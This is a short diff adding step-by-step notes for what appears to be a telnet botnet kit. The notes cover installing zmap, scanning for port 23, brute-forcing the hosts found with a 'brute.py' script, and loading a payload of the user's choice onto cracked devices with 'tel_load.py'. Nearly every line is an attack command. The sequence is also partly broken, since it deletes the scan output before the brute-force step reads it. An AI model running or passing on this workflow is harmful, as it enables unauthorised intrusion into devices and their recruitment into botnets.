@@ -1,0 +1,17 @@
+Be on centos 6 /ubuntu 14.04/debian 8 *64 BIT*
+
+yum update -y
+yum install zmap -y
+
+
+apt-get update -y
+apt-get install zmap -y
+
+ulimit -n 999999
+
+zmap -p23 -o mfu.txt /without lst
+zmap -p23 -wscan.lst -omfu.txt /with lst
+sudo rm -rf mfu.txt
+python brute.py mfu.txt 50 output.txt
+Make Sure to put your payload in "tel_load.py"
+python tel_load.py output.txt
